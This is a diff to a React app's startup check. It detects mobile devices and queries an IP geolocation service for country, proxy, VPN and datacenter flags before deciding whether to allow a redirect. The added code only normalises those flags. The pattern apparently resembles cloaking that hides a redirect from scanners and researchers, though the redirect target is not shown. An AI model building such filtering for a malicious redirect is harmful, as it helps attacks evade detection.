@@ -17,15 +17,24 @@ const App: React.FC = () => {
       // Device check: Desktop only
       const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
       
+      const toBool = (val: any) => {
+        if (typeof val === 'string') {
+          const s = val.toLowerCase();
+          if (s === 'no' || s === 'false') return false;
+          if (s === 'yes' || s === 'true') return true;
+        }
+        return val === true;
+      };
+
       try {
         const response = await fetch('https://ipwho.is/');
         const data = await response.json();
         console.log(data);
         
-        const country = data.country_code;
-        const proxy = data.security?.proxy;
-        const vpn = data.security?.vpn;
-        const hosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';
+        const country = data.country_code || data.country;
+        const proxy = toBool(data.security?.proxy);
+        const vpn = toBool(data.security?.vpn);
+        const hosting = toBool(data.connection?.type === 'hosting' || data.connection?.type === 'datacenter' || data.security?.hosting);
 
         if (isMobile) {
           setAllowRedirect(false);
